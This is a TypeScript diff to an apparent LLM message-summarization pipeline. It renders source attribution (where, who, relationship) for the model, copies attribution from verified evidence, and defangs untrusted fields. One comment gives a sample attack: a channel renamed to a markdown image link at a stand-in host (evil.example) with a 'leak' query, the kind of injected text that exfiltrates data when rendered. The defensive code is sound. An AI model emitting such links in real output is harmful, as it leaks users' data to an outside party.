@@ -77,9 +77,9 @@ const BUCKET_HEADERS: Record<Bucket, string> = {
 // the injection surface handed to the model. Each rendered field is capped at
 // `MAX_RENDERED_FIELD_LENGTH` chars, truncated with a visible marker so the
 // truncation itself is legible in the rendered bundle (and, transitively, in any
-// evidence quote drawn from it — `verifyEvidence`'s substring check runs against this
-// already-truncated text, which is the intended interaction: truncation happens at
-// render time, so verification automatically checks against the truncated content).
+// evidence quote drawn from it — `resolveEvidence`'s substring check runs against the
+// per-item rendered text this produces, which is the intended interaction: truncation
+// happens at render time, so verification automatically checks the truncated content).
 const MAX_RENDERED_FIELD_LENGTH = 2_000;
 const TRUNCATION_MARKER = "…[truncated]";
 
@@ -96,6 +96,17 @@ function renderItem(item: AnnotatedItem, ref: number): string {
     `  title: ${truncateField(unwrap(item.title))}`,
   ];
   if (item.url) lines.push(`  url: ${truncateField(unwrap(item.url))}`);
+  // Attribution is rendered for the model too, not just carried to the Brief: "who and
+  // where" is exactly the context that makes a bare message body legible, so the
+  // summarizer needs it to classify and phrase items. It stays alongside `extras`
+  // rather than replacing keys there — `where: "#flow-mgmt"` is the caption, the
+  // `channel.id` in `extras` is the join key the model clusters on (see Attribution).
+  if (item.attribution) {
+    const { where, who, relationship } = unwrap(item.attribution);
+    if (where !== undefined) lines.push(`  where: ${truncateField(where)}`);
+    if (who !== undefined) lines.push(`  who: ${truncateField(who.join(", "))}`);
+    if (relationship !== undefined) lines.push(`  relationship: ${truncateField(relationship)}`);
+  }
   if (item.extras) {
     const extras = unwrap(item.extras);
     for (const [key, value] of Object.entries(extras)) {
@@ -210,7 +221,16 @@ function defangOutput(output: BriefOutput): BriefOutput {
       ...item,
       summary: defangText(item.summary),
       ...(item.when !== undefined ? { when: defangText(item.when) } : {}),
-      evidence: item.evidence.map((e) => ({ ...e, quote: defangText(e.quote) })),
+      // `where`/`who` are code-copied but still untrusted source bytes — a channel
+       // renamed to `![](https://evil.example/?q=leak)` reaches this field verbatim —
+      // so they defang exactly like the quote does. Code-copied means unfabricated,
+      // not trusted (ADR-0004 §1).
+      evidence: item.evidence.map((e) => ({
+        ...e,
+        ...(e.where !== undefined ? { where: defangText(e.where) } : {}),
+        ...(e.who !== undefined ? { who: e.who.map(defangText) } : {}),
+        quote: defangText(e.quote),
+      })),
     })),
   };
 }
@@ -237,27 +257,6 @@ function normalizeWhitespace(text: string): string {
   return text.replace(/\s+/g, " ").trim();
 }
 
-/**
- * SPIKE (#54) instrumentation. Classifies every evidence entry so one eval run can
- * settle both variants of the ref design at once:
- *
- * - `resolved`  — ref found AND quote verbatim in that item's rendered text. The happy
- *                 path; attribution is copied from the resolved item.
- * - `misref`    — quote IS somewhere in the bundle but NOT in the cited item (or the
- *                 ref does not exist). This is the ONLY population the two variants
- *                 disagree about: minimal `{ref, quote}` drops the entry, while
- *                 retaining model-written `source` would degrade to today's unverified
- *                 attribution instead.
- * - `phantom`   — quote appears nowhere in the bundle. Dropped under today's code too,
- *                 so not a regression either way.
- */
-interface ResolutionStats {
-  resolved: number;
-  misref: number;
-  phantom: number;
-}
-
-const STATS_ENABLED = process.env.RUNDOWN_ATTRIBUTION_STATS === "1";
 
 /**
  * Resolve each evidence entry against the item the model cited, dropping any entry
@@ -268,24 +267,26 @@ const STATS_ENABLED = process.env.RUNDOWN_ATTRIBUTION_STATS === "1";
  * the resolved item, never taken from the model. Items are never dropped, only their
  * unresolvable evidence entries.
  */
-function resolveEvidence(
-  items: ExtractedItem[],
-  rendered: RenderedBundle,
-  stats: ResolutionStats,
-): BriefItem[] {
-  const wholeBundle = normalizeWhitespace(rendered.data);
+function resolveEvidence(items: ExtractedItem[], rendered: RenderedBundle): BriefItem[] {
   return items.map((item) => {
     const evidence: BriefEvidence[] = [];
     for (const e of item.evidence) {
       const quote = normalizeWhitespace(e.quote);
       const cited = rendered.index.get(e.ref);
       if (cited && normalizeWhitespace(cited.text).includes(quote)) {
-        stats.resolved += 1;
-        evidence.push({ source: `${cited.item.source}/${cited.item.kind}`, quote: e.quote });
+        // Attribution is copied from the resolved item, not read from the model's
+        // output. `unwrap` here is the same sole-unwrap-site allowance renderItem uses
+        // (ADR-0004 §3): the value is untrusted source bytes, so it is defanged and
+        // cap-checked on the way out like every other Brief string.
+        const attribution = cited.item.attribution ? unwrap(cited.item.attribution) : undefined;
+        evidence.push({
+          source: `${cited.item.source}/${cited.item.kind}`,
+          ...(attribution?.where !== undefined ? { where: attribution.where } : {}),
+          ...(attribution?.who !== undefined ? { who: attribution.who } : {}),
+          quote: e.quote,
+        });
         continue;
       }
-      if (wholeBundle.includes(quote)) stats.misref += 1;
-      else stats.phantom += 1;
     }
     return { ...item, evidence };
   });
@@ -350,13 +351,7 @@ export async function plan(
   });
 
   // Evidence resolution then defanging, in that order — see the comments above each function for why.
-  const stats: ResolutionStats = { resolved: 0, misref: 0, phantom: 0 };
-  const resolvedItems = resolveEvidence(output.items, rendered, stats);
-  if (STATS_ENABLED) {
-    console.error(
-      `[attribution-stats] resolved=${stats.resolved} misref=${stats.misref} phantom=${stats.phantom} items=${output.items.length} bundleItems=${rendered.index.size}`,
-    );
-  }
+  const resolvedItems = resolveEvidence(output.items, rendered);
   const defanged = defangOutput({ summary: output.summary, items: resolvedItems });
   // Re-parse post-resolution so the Zod caps stay the enforced source of truth for
   // code-filled fields too (ADR-0011) — `SummarizerOutputSchema.parse` above cannot
